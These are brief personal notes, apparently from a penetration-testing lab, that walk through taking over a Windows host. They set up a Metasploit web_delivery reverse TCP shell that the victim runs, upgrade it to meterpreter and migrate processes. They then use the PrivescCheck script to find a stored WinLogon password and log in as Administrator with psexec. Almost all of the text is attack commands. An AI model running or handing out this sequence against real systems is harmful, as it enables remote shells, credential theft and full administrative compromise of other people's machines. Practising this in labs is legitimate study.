**PrivescCheck**
https://github.com/itm4n/PrivescCheck

MSF:
```
search web_delivery / use 1
set target PSH\ (Binary)
set payload windows/shell/reverse_tcp
set PSH-EncodedCOmmand false
set lhost eth1
```

Copy the powershell code and execute on victim.
```shell
shell_to_meterpreter
set win_transfer VBS
set LHOST
set LPORT
run
pgrep > migrate
getprivs

on C:/Users/student/desktop/privesccheck i can find the script
```

Found pass under Creds > WinLogon

# Elevating
Authenticating with psexec - login via SMB/RDP/WinRM

```
psexec.py Administrator@[IP]

# Or msf

search psexec
use exploit/windows/smb/psexec
```

